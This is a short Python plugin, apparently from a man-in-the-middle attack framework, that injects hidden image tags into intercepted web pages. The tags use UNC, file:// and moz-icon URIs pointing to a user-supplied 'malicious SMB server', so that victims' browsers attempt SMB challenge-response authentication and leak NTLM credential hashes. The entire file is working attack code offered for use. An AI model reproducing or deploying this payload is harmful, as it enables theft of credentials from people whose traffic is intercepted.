from plugins.plugin import Plugin
from plugins.Inject import Inject

class SMBAuth(Inject,Plugin):
    name = "SMBAuth"
    optname = "smbauth"
    desc = "Evoke SMB challenge-response auth attempt.\nInherits from Inject."
    def initialize(self,options):
        Inject.initialize(self,options)
        self.target_ip = options.target_ip
        self.html_payload = self._get_data()
    def add_options(self,options):
        options.add_argument("--target-ip",type=str,default="127.0.0.1",
                help="The IP address of your malicious SMB server")
    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">'\
                    % tuple([self.target_ip]*3)
